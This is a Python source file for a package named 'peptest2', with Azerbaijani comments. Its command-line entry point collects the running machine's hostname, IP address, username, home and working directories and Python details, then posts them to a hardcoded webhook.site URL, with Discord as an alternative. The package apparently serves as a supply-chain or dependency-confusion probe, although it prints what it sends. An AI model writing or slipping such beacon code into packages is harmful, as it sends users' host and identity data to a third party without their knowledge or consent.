# src/peptest2/main.py

import platform
import socket
import os
import sys
import json
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None
    print("⚠️ requests library yüklənməyib, webhook işləməyəcək")


# WEBHOOK URL - Öz webhook URL-nizi buraya yazın
WEBHOOK_URL = "https://webhook.site/33a92941-d730-4a54-9e41-d0c9a9319775"  # DƏYIŞ!
# və ya Discord webhook:
# WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"


def get_system_info():
    """Sistem məlumatlarını toplayır"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
    except:
        hostname = "unknown"
        ip_address = "unknown"
    
    info = {
        "timestamp": datetime.now().isoformat(),
        "hostname": hostname,
        "ip_address": ip_address,
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "python_version": sys.version,
        "python_executable": sys.executable,
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "home_directory": os.path.expanduser("~"),
        "current_directory": os.getcwd(),
    }
    
    return info


def send_webhook_notification(event="installation", message="", system_info=None):
    """Webhook-a POST request göndərir"""
    
    if requests is None:
        print("❌ requests library yoxdur, webhook göndərilə bilmir")
        return False
    
    if not WEBHOOK_URL or "your-unique-url" in WEBHOOK_URL:
        print("⚠️ Webhook URL konfiqurasiya edilməyib!")
        return False
    
    try:
        # Göndəriləcək data
        payload = {
            "event": event,
            "message": message,
            "package": "peptest2",
            "version": "1.2.3",
            "system_info": system_info or get_system_info()
        }
        
        # Discord üçün format (əgər Discord webhook istifadə edilirsə)
        if "discord.com" in WEBHOOK_URL:
            discord_payload = {
                "content": f"🔔 **{event.upper()}**",
                "embeds": [{
                    "title": "peptest2 Package Event",
                    "description": message,
                    "color": 3447003,
                    "fields": [
                        {"name": "Event", "value": event, "inline": True},
                        {"name": "Version", "value": "1.2.3", "inline": True},
                        {"name": "Platform", "value": system_info.get("platform", "unknown"), "inline": True},
                        {"name": "Hostname", "value": system_info.get("hostname", "unknown"), "inline": True},
                        {"name": "Username", "value": system_info.get("username", "unknown"), "inline": True},
                        {"name": "Python", "value": system_info.get("python_version", "unknown").split()[0], "inline": True},
                    ],
                    "timestamp": datetime.now().isoformat()
                }]
            }
            response = requests.post(WEBHOOK_URL, json=discord_payload, timeout=5)
        else:
            # Normal webhook
            response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        
        if response.status_code in [200, 204]:
            print(f"✅ Webhook uğurla göndərildi: {event}")
            return True
        else:
            print(f"⚠️ Webhook cavabı: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Webhook xətası: {e}")
        return False


def main():
    """Əsas funksiya - CLI entry point"""
    print("\n" + "="*60)
    print("🎯 peptest2 - Test Paketi")
    print("="*60)
    
    # Sistem məlumatlarını göstər
    print("\n📊 Sistem Məlumatları:")
    sys_info = get_system_info()
    
    for key, value in sys_info.items():
        if key not in ['python_version']:  # Çox uzun olanları atlayırıq
            print(f"  • {key}: {value}")
    
    # Webhook göndər
    print("\n📡 Webhook bildirişi göndərilir...")
    send_webhook_notification(
        event="command_executed",
        message="peptest2 command line tool istifadə edildi",
        system_info=sys_info
    )
    
    print("\n✅ Əməliyyat tamamlandı!")
    print("="*60 + "\n")


if __name__ == "__main__":
    main()